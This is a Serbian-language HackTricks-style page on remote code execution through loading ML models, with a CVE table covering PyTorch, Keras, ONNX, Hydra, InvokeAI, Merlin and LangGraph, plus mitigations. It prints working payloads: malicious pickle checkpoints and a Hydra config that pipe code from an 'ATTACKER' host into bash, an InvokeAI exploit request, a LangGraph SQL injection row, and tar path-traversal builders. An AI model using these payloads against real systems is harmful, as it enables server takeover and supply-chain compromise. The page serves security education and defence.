# RCE modela

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela do RCE-a

Machine Learning modeli se obično dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch itd. Ovi modeli se mogu učitati na developerske mašine ili produkcione sisteme kako bi se koristili. Modeli obično ne bi trebalo da sadrže malicious code, ali postoje slučajevi u kojima se model može koristiti za izvršavanje proizvoljnog koda na sistemu, bilo kao predviđena funkcionalnost ili zbog vulnerability-ja u biblioteci za učitavanje modela.

U trenutku pisanja ovog teksta, neki primeri ove vrste vulnerabilities su:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle u checkpoint-u modela dovodi do izvršavanja koda (zaobilazeći `weights_only` zaštitu)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious download modela uzrokuje izvršavanje koda; Java deserialization RCE u management API-ju                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization preko `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint aktivira pickle reducer tokom `load_model_trainer_states_from_checkpoint` → izvršavanje koda u ML worker-u            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` ključ ubacuje SQL/JSON-path syntax, `UNION SELECT` konstruiše lažni checkpoint red, a zatim `msgpack` deserialization importuje i poziva Python kod koji je izabrao attacker | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML-a koristi `yaml.unsafe_load` (code exec) <br> Učitavanje modela sa **Lambda** layer-om pokreće proizvoljan Python kod          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model aktivira integer overflow → heap corruption (potencijalni RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela preko `joblib.load` izvršava pickle sa attacker-ovim `__reduce__` payload-om                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Podrazumevana opcija `numpy.load` dozvoljavala je pickled object arrays – malicious `.npy/.npz` pokreće code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Putanja external-weights u ONNX modelu može izaći iz direktorijuma (čitanje proizvoljnih fajlova) <br> Malicious ONNX model tar može prepisati proizvoljne fajlove (što dovodi do RCE-a) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model sa custom operator-om zahteva učitavanje attacker-ovog native code-a; kompleksni grafovi modela zloupotrebljavaju logiku za izvršavanje nenamernih computation-a   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Korišćenje model-load API-ja sa omogućenim `--model-control` dozvoljava relativni path traversal za upisivanje fajlova (npr. prepisivanje `.bashrc` fajla radi RCE-a)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF fajl modela izaziva heap buffer overflows u parser-u, omogućavajući proizvoljno izvršavanje koda na sistemu žrtve                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model sa Lambda layer-om i dalje izvršava kod pri učitavanju (Keras safe_mode ne pokriva stari format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Mnogi ML alati (npr. formati modela zasnovani na pickle-u, Python `pickle.load`) izvršavaće proizvoljan kod ugrađen u fajlove modela, osim ako se to ne ublaži | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata prosleđen funkciji `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled metadata/konfiguracija modela postavlja `_target_` na proizvoljni callable (npr. `builtins.exec`) → izvršava se tokom učitavanja, čak i sa “safe” formatima (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Pored toga, postoje Python pickle-based modeli, kao oni koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji se mogu koristiti za izvršavanje proizvoljnog koda na sistemu ako se ne učitavaju sa `weights_only=True`. Zbog toga svaki pickle-based model može biti posebno podložan ovoj vrsti napada, čak i ako nije naveden u gornjoj tabeli.

### Hydra metadata → RCE (radi čak i sa safetensors)

`hydra.utils.instantiate()` importuje i poziva bilo koji dotted `_target_` u configuration/metadata objektu. Kada biblioteke proslede **untrusted model metadata** funkciji `instantiate()`, attacker može proslediti callable i argumente koji se odmah izvršavaju tokom učitavanja modela (pickle nije potreban).<sup>[[12]](#references)[[13]](#references)</sup>

Primer payload-a (radi u `.nemo` `model_config.yaml`, repo `config.json` ili `__metadata__` unutar `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ključne tačke:
- Pokreće se pre inicijalizacije modela u NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders i FlexTok loaders.
- Hydra-ina string block-lista može da se zaobiđe korišćenjem alternativnih putanja za import (npr. `enum.bltns.eval`) ili imena koja aplikacija razrešava (npr. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok takođe parsira stringifikovane metapodatke pomoću `ast.literal_eval`, što omogućava DoS (prekomernu potrošnju CPU-a/memorije) pre Hydra poziva.

### 🆕  InvokeAI RCE putem `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source web interfejs za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install`, koji korisnicima omogućava preuzimanje i učitavanje modela sa proizvoljnih URL-ova.<sup>[[1]](#references)</sup>

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Kada je prosleđeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` izvršava **pickle deserialization**. Pošto sadržaj dolazi direktno sa URL-a pod kontrolom korisnika, napadač može da ubaci zlonamerni objekat sa prilagođenom metodom `__reduce__` unutar checkpoint-a; metoda se izvršava **tokom deserialization-a**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranljivosti je dodeljen identifikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Vodič kroz exploitation

1. Kreirajte zlonamerni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Aktivirajte ranjivu krajnju tačku (autentikacija nije potrebna):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme fajl, poziva `torch.load()` → gadget `os.system` se izvršava i napadač dobija izvršavanje koda u kontekstu InvokeAI procesa.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.<sup>[[3]](#references)</sup>

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (podrazumevana vrednost scan flag-a je **false**)
•  `/api/v2/models/install` dostupan napadaču
•  Proces ima dozvole za izvršavanje shell komandi

#### Ublažavanje

* Nadogradite na **InvokeAI ≥ 5.4.3** – patch podrazumevano postavlja `scan=True` i vrši malware scanning pre deserializacije.<sup>[[2]](#references)</sup>
* Kada programski učitavate checkpoints, koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Uvedite allow-lists / potpise za izvore modela i pokrenite servis sa najmanjim potrebnim privilegijama.

> ⚠️ Imajte na umu da je svaki format zasnovan na Python pickle-u (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) inherentno nebezbedan za deserializaciju iz nepouzdanih izvora.

---

Primer ad-hoc ublažavanja ako morate da starije verzije InvokeAI pokrećete iza reverse proxy-ja:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE preko nebezbednog `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (deo Merlin-a) izložio je nebezbedni checkpoint loader koji je direktno pozivao `torch.load()` nad putanjama koje zadaje korisnik. Pošto se `torch.load` oslanja na Python `pickle`, checkpoint pod kontrolom napadača može izvršiti proizvoljan kod putem reducer-a tokom deserializacije.<sup>[[5]](#references)</sup>

Ranjiva putanja (pre ispravke): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo dovodi do RCE-a: U Python `pickle`-u, objekat može definisati reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Callable se izvršava tokom unpickling-a. Ako je takav objekat prisutan u checkpoint-u, izvršava se pre upotrebe bilo kojih weight-ova.

Minimalni primer zlonamernog checkpoint-a:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektori isporuke i radijus posledica:
- Trojanizovani checkpoint-i/modeli deljeni putem repo-a, bucket-a ili artifact registry-ja
- Automatizovani resume/deploy pipeline-ovi koji automatski učitavaju checkpoint-e
- Izvršavanje se odvija unutar training/inference worker-a, često sa povišenim privilegijama (npr. root u container-ima)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktni `torch.load()` ograničenim, allow-listed deserializer-om implementiranim u `transformers4rec/utils/serialization.py`. Novi loader proverava tipove/polja i sprečava pozivanje proizvoljnih callable objekata tokom učitavanja.<sup>[[7]](#references)</sup>

Defensive smernice specifične za PyTorch checkpoint-e:
- Ne vršite unpickle nepouzdanih podataka. Kada je moguće, koristite neizvršne formate kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX.
- Ako morate da koristite PyTorch serialization, obezbedite `weights_only=True` (podržano u novijim verzijama PyTorch-a) ili koristite prilagođeni allow-listed unpickler sličan Transformers4Rec patch-u.<sup>[[4]](#references)</sup>
- Sprovodite proveru porekla/signatura modela i sandbox-ujte deserialization (seccomp/AppArmor; non-root korisnik; ograničen FS i bez network egress-a).
- Pratite neočekivane child procese koje ML servisi pokreću u trenutku učitavanja checkpoint-a; pratite upotrebu `torch.load()`/`pickle`.

POC i reference za vulnerable/patch verzije:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Primer – izrada malicious PyTorch modela

- Kreirajte model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitajte model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserializacija Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent-ov FaceDetection-DSFD izlaže `resnet` endpoint koji deserializuje podatke pod kontrolom korisnika. ZDI je potvrdio da udaljeni napadač može navesti žrtvu da učita zlonamernu stranicu/datoteku, da ona pošalje posebno napravljen serijalizovani blob tom endpointu i pokrene deserializaciju sa privilegijama `root`, što dovodi do potpune kompromitacije.

Tok exploita prati tipičnu zloupotrebu pickle-a:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Svaki gadget dostupan tokom deserializacije (konstruktori, `__setstate__`, callback funkcije frameworka itd.) može biti na isti način iskorišćen, bez obzira na to da li je prenos obavljen putem HTTP-a, WebSocket-a ili datoteke ubačene u direktorijum koji se nadgleda.



### LangGraph checkpointer SQLi → MessagePack RCE

Ovaj lanac napada je zanimljiv zato što napadač **ne mora da otpremi zlonamernu datoteku modela**. Umesto toga, aplikacija izlaže **API za perzistenciju AI-agenta** (`get_state_history(..., filter=...)`), a korisnički unos dospeva do query builder-a checkpointera.

#### 1. Strukturni SQLi u filterima metapodataka

Ranjivi SQLite obrazac izgledao je ovako:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Vrednost se vezuje kasnije, ali se `query_key` konkatenira u **JSON path string**, tako da `'` unutar ključa rečnika prekida `'$.{query_key}'` i ubacuje SQL. Ista lekcija važi za **JSON paths, identifiers, operators, `LIMIT` i TTL fields**: placeholders štite samo vrednosti, a ne strukturnu sintaksu upita.

#### 2. `UNION SELECT` može ciljati downstream sinks, a ne samo krađu podataka

Upit vraća `type` i serijalizovane `checkpoint` bajtove, koje kasnije koriste:
```python
self.serde.loads_typed((type, checkpoint))
```
To znači da SQLi u klauzuli `WHERE` može da ubaci **lažni red rezultata**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Ako kasniji kod parsira, deserijalizuje, upisuje ili izvršava neku izabranu kolonu, mapirajte te kolone na njihove sinkove. U ovom slučaju lažni red pretvara SQLi u **deserijalizaciju pod kontrolom napadača**.

#### 3. Nesigurni MessagePack extension hooks ekvivalentni su code gadgetima

LangGraph-ov `msgpack` path koristio je prilagođeni extension hook koji je raspakovao ugnježdeni tuple i izvršavao:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Dakle, MessagePack extension objekat koji kodira nešto ekvivalentno `("os", "system", "id > /tmp/pwned")` importuje `os`, pronalazi `system` i izvršava komandu. Prilikom pregleda AI framework-a, proverite **custom MessagePack/JSON/pickle revivers** zbog dinamičkog importovanja, reflection-a ili proizvoljnog pozivanja funkcija.

#### 4. Praktični obrazac za audit agent framework-a

Proverite svaki input kojim može upravljati korisnik, a koji dospeva do:
- API-ja za listanje state history / memory / replay / checkpoint podataka
- structured filter builder-a koji generišu SQL ili Redis query fragmente
- custom deserializer-a (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery putanja koje veruju redovima vraćenim iz persistence layer-a

Ovaj konkretni lanac uticao je na self-hosted LangGraph deployment-e koji koriste **SQLite** ili **Redis** checkpointer-e kada su nepouzdani korisnici mogli da kontrolišu `filter`. Patch-ovane verzije navedene u disclosure-u bile su `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` i `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modeli za Path Traversal

Kao što je navedeno u [**ovom blog postu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina model formata koje koriste različiti AI framework-i zasnovana je na arhivama, obično `.zip` fajlovima. Zbog toga bi moglo biti moguće zloupotrebiti ove formate za izvođenje Path Traversal napada, što omogućava čitanje proizvoljnih fajlova sa sistema na kojem je model učitan.<sup>[[16]](#references)</sup>

Na primer, sledećim kodom možete kreirati model koji će prilikom učitavanja kreirati fajl u direktorijumu `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, sledećim kodom možete kreirati model koji će prilikom učitavanja kreirati simboličku vezu ka direktorijumu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dubinska analiza: Keras .keras deserijalizacija i gadget hunting

Za fokusirani vodič kroz .keras internals, Lambda-layer RCE, problem proizvoljnog importa u verzijama ≤ 3.8 i otkrivanje gadgeta unutar allowlist-a nakon ispravke, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Reference

- [1] [OffSec blog – "CVE-2024-12029 – Deserijalizacija nepouzdanih podataka u InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI commit sa ispravkom 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacija Rapid7 Metasploit modula](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Dobijanje Remote Code Execution u NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI savet: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec commit sa ispravkom b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Vulnerable loader pre patch-a (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nakon patch-a (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution sa modernim AI/ML formatima i bibliotekama](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate dokumentacija](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (upozorenje o RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Od SQLi do RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pretvaranje Archive Slip grešaka u vredne AI/ML bounty-je](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
